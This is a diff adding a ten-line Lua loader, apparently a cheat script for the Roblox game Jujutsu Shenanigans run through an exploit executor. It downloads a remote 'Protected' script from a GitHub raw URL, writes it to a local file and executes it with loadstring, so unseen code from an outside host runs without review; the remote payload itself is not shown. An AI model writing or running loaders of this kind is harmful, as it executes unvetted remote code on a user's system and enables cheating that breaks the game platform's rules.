@@ -1,0 +1,10 @@
+local url = "https://raw.githubusercontent.com/Nwepnet/JujutsuShenanigansStuffAaa/refs/heads/main/Protected_8991714364411077.txt" -- The script URL  
+local fileName = "Thisfileisonlyheretobeaarchivetoreupload.lua" -- Name of the saved file  
+
+-- Always check and download the file  
+if not isfile(fileName) then  
+    writefile(fileName, game:HttpGet(url))  
+end  
+
+-- Execute the downloaded Lua script  
+loadstring(readfile(fileName))()
